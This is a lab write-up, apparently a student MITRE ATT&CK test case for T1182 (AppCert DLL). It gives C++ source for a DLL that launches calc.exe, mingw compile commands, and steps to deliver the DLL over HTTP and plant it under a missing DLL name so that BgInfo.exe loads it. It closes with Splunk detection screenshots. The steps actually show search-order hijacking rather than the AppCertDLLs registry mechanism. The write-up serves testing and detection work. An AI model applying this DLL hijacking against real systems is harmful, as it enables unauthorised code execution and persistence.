<h1>Technique Description</h1>
<h2>T1182 - AppCert DLL</h2>
<h2><a href="https://attack.mitre.org/techniques/T1182/">Description from ATT&CK</a></h2>
<blockquote>
 Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager are loaded into every process that calls the ubiquitously used application programming interface (API) functions:
   * CreateProcess
  * CreateProcessAsUser
  * CreateProcessWithLoginW
  * CreateProcessWithTokenW
  * WinExec
</blockquote>

<h1>Assumption</h1>
Assume that the victim device is already compromised, and able to download files from a web server.

<h1>Execution</h1>

![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Finding%20the%20missing%20DLL%20name.png)
*Figure 1: Looking for missing DLL*

After finding the missing file we will be creating a simple DLL file that will open calc.exe

__Steps to create the DLL file:__
1. Create a C++ file with the follwoing code:
```c++
#include <windows.h>
int fireLazor(){
    WinExec("calc", 0);
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved){
    fireLazor();
    return 0;
}
```
2. Compiling it with mindw32 to make it as DLL file
```bash
i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
```
![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Creating%20Malicious%20DLL.png)
*Figure 2: Creating Malicious DLL*

Using python simple HTTP server, sending the malicious code to the victim.
![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Using%20simple%20HTTP%20Server%20to%20send%20the%20DLL%20file.png)
*Figure 3: Using simple HTTP Server to send the DLL file*



Copy the malicious DLL fie to the same directory that the program expecting the file to be and rename the DLL file to the exact name that program looking for.
![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Placing%20the%20Injected%20DLL%20with%20the%20same%20name%20as%20misisng%20DLL%20in%20the%20same%20path.png)
*Figure 5: Placing the file*

Everything is set it up correctly, and now start the BgInfo.exe, it should load our DLL
![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Injected%20DLL%20execution.png)
*Figure 6: BgInfo.exe loaded new DLL*

<h1>Detection</h1>

To confirm this, we can use Splunk to analyze.
![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/BGInfo-exe%20started%20with%20extra%20args.png)
*Figure 7: BgInfo.exe started with extra arguments/parameters*

![alt text](https://github.com/iamSoruban/group9_mitre_testcases/blob/iamSoruban-patch-1/Parent%20process%20Bginfo%20started%20calc-exe.png)
*Figure 8: Parent process Bginfo started calc.exe*
